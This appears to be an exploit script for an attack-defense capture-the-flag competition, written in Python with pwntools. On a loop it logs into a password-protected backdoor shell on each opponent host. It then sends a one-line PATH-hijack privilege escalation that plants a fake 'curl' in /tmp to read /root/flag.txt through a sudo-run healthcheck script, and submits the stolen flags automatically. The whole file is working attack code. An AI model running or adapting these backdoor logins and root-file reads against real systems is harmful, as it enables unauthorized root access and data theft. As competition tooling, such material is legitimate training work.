import requests
import multiprocessing
import time
# ---------------------------
# add your imports here
# ---------------------------
from pwn import *

# CONFIGURATION
SUBMITTER_SERVER = f"http://localhost:8900"
CHALL_ID = '2'
SELF_IP = '10.0.2.32'
TIMEOUT = 20
FLAG_FORMAT="LKS{"
TICK_DURATION = 300 #in seconds

# BACKDOOR CONFIGURATION
SPAWN_SHELL_PORT = 5432
BACKDOOR_PASSWORD = b"stembajaya7777"

def exploit(target, portSpawnShell):
  try:
    # spawn shell
    p = remote(target, portSpawnShell)
    context.log_level = 'error'

    p.sendlineafter(b"Password: ", BACKDOOR_PASSWORD)
    p.recvuntil(b"Backdoor active on port: ")
    port_target = int(p.recvline().strip().decode())
    p.close()
    
    print('='*30)
    print(f"[+] Backdoor active on port: {target} {port_target}")

    # connect to shell, do the exploit
    r = remote(target, port_target)
    context.log_level = 'error'

    # exploit goes here
    # start
    r.sendline(b"mkdir /tmp/fakebin;echo -e '#!/bin/bash\ncat /root/flag.txt' > /tmp/fakebin/curl;chmod +x /tmp/fakebin/curl;PATH=/tmp/fakebin:$PATH sudo /opt/healthcheck.sh")
    r.recvuntil(b"status code ")
    flag = r.recvline().strip().decode().replace("}.", "}")
    r.close()
    
    if FLAG_FORMAT not in flag:
      raise Exception(f"Flag not found")
    
    return flag
  except Exception as e:
    print(f"[-] Error: {e} ({target})")
    return

def process_exploit(target_ip, port):
  try:
    print(f"[+] Target IP: {target_ip}")

    flag = exploit(target_ip, port)

    if not flag:
      print(f"[-] Exploit failed ({target_ip})")
      return

    print(f"[+] Flag from {target_ip}: {flag}")

    res = requests.post(SUBMITTER_SERVER+"/submit", json={'flag': flag}, timeout=60)

    if res.status_code != 200:
      print(f"[-] Submit failed for {target_ip}: {res.status_code}")
      print(res.text)
    else:
      print(f"[+] Submitter response: {res.text}")

  except requests.exceptions.Timeout :
    print("!!!!!!!SUBMITTER BERMASALAH!!!!!!!")
    print("segera periksa error pada submiter")

  except Exception as e:
    print(f"[-] Error: {e}")

def main():
    # Config server dan port
    services =  requests.get(url=SUBMITTER_SERVER+"/services").json()['data'][CHALL_ID]
    
    print(f"[+] Services: {services}")

    # optional
    # filter services to exclude yout own IP
    # services = {k: v for k, v in services.items() if v != SELF_IP}

    timer = 0
    
    while True:
        if timer > 0:
            print(f"[+] Next Exploit in: {timer} seconds", end="\r")
            timer -= 1
            time.sleep(1)
            continue
      
        start_time = time.time()

        for target_id, target_ip in services.items():
            process = multiprocessing.Process(target=process_exploit, args=(target_ip, SPAWN_SHELL_PORT))
            process.start()

            process.join(timeout=TIMEOUT)

            if process.is_alive():
                print(f"[-] Timeout! Terminating exploit for {target_ip}")
                process.terminate()
                process.join()

        # reset timer goes here in seconds    
        elapsed = time.time() - start_time
        timer = max(0, TICK_DURATION - int(elapsed))
        
if __name__ == "__main__":
    main()